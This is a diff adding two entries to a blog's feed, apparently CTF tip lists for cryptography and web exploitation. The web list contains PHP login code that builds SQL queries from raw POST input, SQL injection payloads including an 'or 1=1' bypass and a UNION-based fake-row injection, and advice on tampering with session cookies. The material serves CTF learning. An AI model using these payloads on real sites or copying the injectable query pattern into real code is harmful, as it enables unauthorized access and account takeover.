+    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Cryptography challenges during various CTF&rsquo;s.</p>
+
+<!-- more -->
+
+
+<ol>
+<li>Caesar cipher and substitution cipher can be solved by using <a href="https://www.cryptool.org/en/cryptool1-en">Cryptool 1</a>. Just check the Analysis option, there&rsquo;s analysis for Symmetric Key, Asymmetric Key, Hash and others. Otherwise, a good website to solve substitution cipher is <a href="http://quipqiup.com/">Quipqiup</a>.
+<br></li>
+<li>If you get some text atleast few paragraphs and some random numbers as (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1), it might mean (Paragraph, Line, Word).
+<br></li>
+<li>If you get some ciphertext encrypted by XOR, <a href="https://github.com/hellman/xortool">xortool</a> might be helpful. It can help you to find the key length and the key.</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Learning From CTF : Web Exploitation]]></title>
+    <link href="http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation/"/>
+    <updated>2014-11-06T19:02:50+00:00</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation</id>
+    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF&rsquo;s.</p>
+
+<!-- more -->
+
+
+<ol>
+<li> You may want to use your browser to view the source of the web page. Sometimes, important information is hidden using comments.</li>
+<br>
+<li> It may be helpful to learn how to &#8216;Inspect Elements&#8217; in your browser. It helps you to distinguish each element which might be or not be hidden. </li>
+<br>
+<li> Some symbols need to be URL Encoded when included in GET requests.
+<br>
+<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
+<caption>Reserved characters after percent-encoding</caption>
+<tr>
+<td><code>!</code></td>
+<td><code>#</code></td>
+<td><code>$</code></td>
+<td><code>&amp;</code></td>
+<td><code>'</code></td>
+<td><code>(</code></td>
+<td><code>)</code></td>
+<td><code>*</code></td>
+<td><code>+</code></td>
+<td><code>,</code></td>
+<td><code>/</code></td>
+<td><code>:</code></td>
+<td><code>;</code></td>
+<td><code>=</code></td>
+<td><code>?</code></td>
+<td><code>@</code></td>
+<td><code>[</code></td>
+<td><code>]</code></td>
+</tr>
+<tr>
+<td><code>%21</code></td>
+<td><code>%23</code></td>
+<td><code>%24</code></td>
+<td><code>%26</code></td>
+<td><code>%27</code></td>
+<td><code>%28</code></td>
+<td><code>%29</code></td>
+<td><code>%2A</code></td>
+<td><code>%2B</code></td>
+<td><code>%2C</code></td>
+<td><code>%2F</code></td>
+<td><code>%3A</code></td>
+<td><code>%3B</code></td>
+<td><code>%3D</code></td>
+<td><code>%3F</code></td>
+<td><code>%40</code></td>
+<td><code>%5B</code></td>
+<td><code>%5D</code></td>
+</tr>
+</table>
+<br>
+<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
+<caption>Common characters after percent-encoding (ASCII or UTF-8 based)</caption>
+<tr>
+<td>newline</td>
+<td>space</td>
+<td><code>"</code></td>
+<td><code>%</code></td>
+<td><code>-</code></td>
+<td><code>.</code></td>
+<td><code>&lt;</code></td>
+<td><code>&gt;</code></td>
+<td><code>\</code></td>
+<td><code>^</code></td>
+<td><code>_</code></td>
+<td><code>`</code></td>
+<td><code>{</code></td>
+<td><code>|</code></td>
+<td><code>}</code></td>
+<td><code>~</code></td>
+</tr>
+<tr>
+<td><code>%0A</code> <i>or</i> <code>%0D</code> <i>or</i> <code>%0D%0A</code></td>
+<td><code>%20</code></td>
+<td><code>%22</code></td>
+<td><code>%25</code></td>
+<td><code>%2D</code></td>
+<td><code>%2E</code></td>
+<td><code>%3C</code></td>
+<td><code>%3E</code></td>
+<td><code>%5C</code></td>
+<td><code>%5E</code></td>
+<td><code>%5F</code></td>
+<td><code>%60</code></td>
+<td><code>%7B</code></td>
+<td><code>%7C</code></td>
+<td><code>%7D</code></td>
+<td><code>%7E</code></td>
+</tr>
+</table>
+</li>
+<br>
+<li> In some web exploitation challenges, if the secret is stored on the client side and there are some javascript involved, you could possibly find the answer in the Javascript console, Browser Developer Tools.  (F12 Key).</li>
+<br>
+<li>Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.</li>
+<br>
+<li>If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as admin&#8217; or 1=1 limit 1;#
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$username = $_POST["username"];
+</span><span class='line'>$password = $_POST["password"];
+</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+</span><span class='line'>$result = mysqli_query($con, $query);
+</span><span class='line'>
+</span><span class='line'>if (mysqli_num_rows($result) !== 1) {
+</span><span class='line'>  echo "&lt;h1&gt;Login failed.&lt;/h1&gt;";
+</span><span class='line'>} else {
+</span><span class='line'>  echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
+</span><span class='line'>  echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+</li>
+<li>If the Login prompt contains SQL query and checks only one result, plus have extra checks (see example below), then we can create a fake row SQL whose value we control.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$con = mysqli_connect("localhost", "sql2", "sql2", "sql2");
+</span><span class='line'>$username = $_POST["username"];
+</span><span class='line'>$password = $_POST["password"];
+</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username'";
+</span><span class='line'>$result = mysqli_query($con, $query);
+</span><span class='line'>
+</span><span class='line'>$logged_in = false;
+</span><span class='line'>if (mysqli_num_rows($result) === 1) {
+</span><span class='line'>  $row = mysqli_fetch_array($result);
+</span><span class='line'>  if ($row["password"] === $password) {
+</span><span class='line'>    $logged_in = true;
+</span><span class='line'>    echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
+</span><span class='line'>    echo "&lt;pre&gt;User level: ", $row["user_level"],  "&lt;/pre&gt;";
+</span><span class='line'>    if ($row["user_level"] &gt;= 1337) {
+</span><span class='line'>      echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
+</span><span class='line'>    } else {
+</span><span class='line'>      echo "&lt;p&gt;Only user levels 1337 or above can see the flag.&lt;/p&gt;";
+</span><span class='line'>    }
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+You have to create a fake query such as
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level --
+</span><span class='line'>where  
+</span><span class='line'>The ' closes the username string and 1=0 will always return false, invalidating the first half.
+</span><span class='line'>The union all statement allows us to concatenate two SQL select queries, so we append UNION ALL and then our fake select statement.</span></code></pre></td></tr></table></div></figure>
+Don&#8217;t forget to enter the same password in the password field :P
+</li>
+<br>
+<li>Perl Script running on a webpage, read <a href="http://www.cgisecurity.com/lib/sips.html">Security Issues in Perl Scripts</a></li>
+<br>
+<li>In some web exploitation excercises, you can modify the GET/POST request in the burpsuite to get the flag.</li>
+<br>
+</ol>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Learning From VulnHub]]></title>
